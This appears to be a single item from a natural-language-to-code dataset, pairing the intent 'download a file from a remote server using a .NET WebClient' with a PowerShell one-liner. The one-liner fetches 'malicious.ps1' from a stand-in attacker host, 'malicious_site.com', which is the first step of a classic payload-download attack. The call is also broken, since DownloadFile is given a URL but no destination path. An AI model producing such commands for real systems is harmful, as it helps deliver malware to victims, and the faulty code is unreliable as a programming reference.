# Natural language intent:
# Download a file from a remote server using a .NET WebClient.

$Download = New-Object System.Net.WebClient; $Download.DownloadFile('http://malicious_site.com/malicious.ps1')
